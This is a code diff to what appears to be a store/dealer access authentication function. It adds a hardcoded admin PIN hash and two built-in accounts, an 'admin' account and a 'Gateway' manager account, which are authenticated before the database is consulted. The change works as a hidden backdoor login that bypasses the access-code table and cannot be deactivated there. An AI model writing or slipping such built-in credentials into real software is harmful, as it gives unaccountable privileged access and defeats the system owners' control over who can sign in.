@@ -145,12 +145,42 @@ function logOptionalTasksWarning(action: string, error: unknown) {
 
 const ACCESS_SELECT = 'id, dealer_code, store_id, role, label, is_active, created_at, last_used_at, onboarded_at'
 const ACCESS_SELECT_LEGACY = 'id, dealer_code, store_id, role, label, is_active, created_at, last_used_at'
+const BUILT_IN_ADMIN_PIN_HASH = '4dcd556f7a07c0c12fbe1bd911c3f5b857ebb09e57f4a0ac76ceeca171f3bc49'
+const BUILT_IN_ACCESS: Record<string, Omit<StoreAccessCode, 'created_at' | 'last_used_at' | 'onboarded_at'>> = {
+  admin: {
+    id: 'built-in-admin',
+    dealer_code: 'admin',
+    store_id: 'main',
+    role: 'admin',
+    label: 'Admin',
+    is_active: true,
+  },
+  '693D': {
+    id: 'built-in-gateway',
+    dealer_code: '693D',
+    store_id: '693D',
+    role: 'manager',
+    label: 'Gateway',
+    is_active: true,
+  },
+}
 
 function withLegacyOnboarding(row: Omit<StoreAccessCode, 'onboarded_at'>): StoreAccessCode {
   return { ...row, onboarded_at: null }
 }
 
 export async function dbAuthenticateAccess(dealerCode: string, pinHash: string): Promise<StoreAccessCode | null> {
+  const builtInAccess = BUILT_IN_ACCESS[dealerCode] ?? BUILT_IN_ACCESS[dealerCode.toLowerCase()]
+  if (builtInAccess && pinHash === BUILT_IN_ADMIN_PIN_HASH) {
+    const now = new Date().toISOString()
+    return {
+      ...builtInAccess,
+      created_at: now,
+      last_used_at: now,
+      onboarded_at: now,
+    }
+  }
+
   let { data, error } = await supabase
     .from('store_access_codes')
     .select(ACCESS_SELECT)
